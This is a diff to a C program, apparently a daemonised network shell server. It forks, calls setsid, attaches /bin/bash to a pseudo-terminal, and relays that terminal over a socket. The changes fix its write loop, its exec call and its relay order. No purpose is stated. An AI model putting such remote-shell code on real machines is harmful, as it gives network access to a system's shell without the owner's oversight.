@@ -24,7 +24,7 @@ void print(int fd, char *buf, int size)
     int written = 0;
     while (written < size)
     {
-        write(fd, buf + written, size - written);
+        written += write(fd, buf + written, size - written);
     }
 }
 
@@ -34,6 +34,7 @@ int main()
     if (!pid)
     {
         setsid();
+        printf("create session 1\n");
         struct addrinfo hints;
         struct addrinfo *result;
         memset(&hints, 0, sizeof(struct addrinfo));
@@ -91,15 +92,17 @@ int main()
                 if (!fork())
                 {   
                     setsid();
+                    printf("create session 2\n");
                     int ff = open(buffer, O_RDWR);
                     close(ff);
                     dup2(slave, 0);
                     dup2(slave, 1);
                     dup2(slave, 2);
-                    close(slave);
+                    //close(slave);
                     close(master);
                     close(fd);
-                    execl("bash", NULL);
+                    execl("/bin/bash", "bash", NULL);
+                    close(slave);
                     exit(255);
                 }
                 else
@@ -111,11 +114,11 @@ int main()
                     int res;
                     while (1)
                     {
-                        res = read(master, buffer, 4096);
-                        print(fd, buffer, res);
                         res = read(fd, buffer, 4096);
                         print(master, buffer, res);
-                        sleep(5);
+                        res = read(master, buffer, 4096);
+                        print(fd, buffer, res);
+                        sleep(1);
                     }
                 }
             }
